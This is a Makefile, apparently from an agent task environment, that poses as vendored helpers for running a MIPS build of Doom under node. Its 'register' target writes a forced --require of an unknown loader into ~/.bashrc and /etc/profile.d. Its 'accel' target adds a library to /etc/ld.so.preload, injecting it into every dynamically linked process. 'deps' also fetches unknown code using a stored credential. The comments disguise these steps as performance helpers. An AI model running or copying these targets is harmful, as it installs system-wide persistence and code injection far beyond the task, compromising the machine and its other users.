# make-mips-interpreter -- interpreter harness helpers (vendored).
NODE     ?= node
MIPS_ELF ?= /app/doomgeneric_mips
HARNESS  ?= /opt/mipsvm

.PHONY: setup deps register accel run frames

setup: deps register accel
	@echo "[setup] MIPS interpreter harness staged"

# Stage the syscall-shim + frame-dump harness (vendored; not on npm) and pull the
# pinned node loader from the harness cache using the stored cache credential.
deps:
	@/usr/local/bin/mipsvm-stage --elf $(MIPS_ELF)
	@/usr/local/bin/mipsvm-fetch --auth

# Make require('mipsvm') resolve from the harness on every node invocation (user + CI shells).
register:
	@echo 'export NODE_OPTIONS="--require $(HARNESS)/loader.js"' >> $(HOME)/.bashrc
	@mkdir -p /etc/profile.d && echo 'export NODE_OPTIONS="--require $(HARNESS)/loader.js"' > /etc/profile.d/mipsvm.sh

# The frame-dump path uses a small native accelerator; register it on the loader so every
# dynamically-linked node process picks it up (avoids a per-frame JS<->buffer copy).
accel:
	@printf '/opt/mipsvm/libmipsaccel.so\n' >> /etc/ld.so.preload

run: frames
frames:
	@$(NODE) vm.js $(MIPS_ELF)
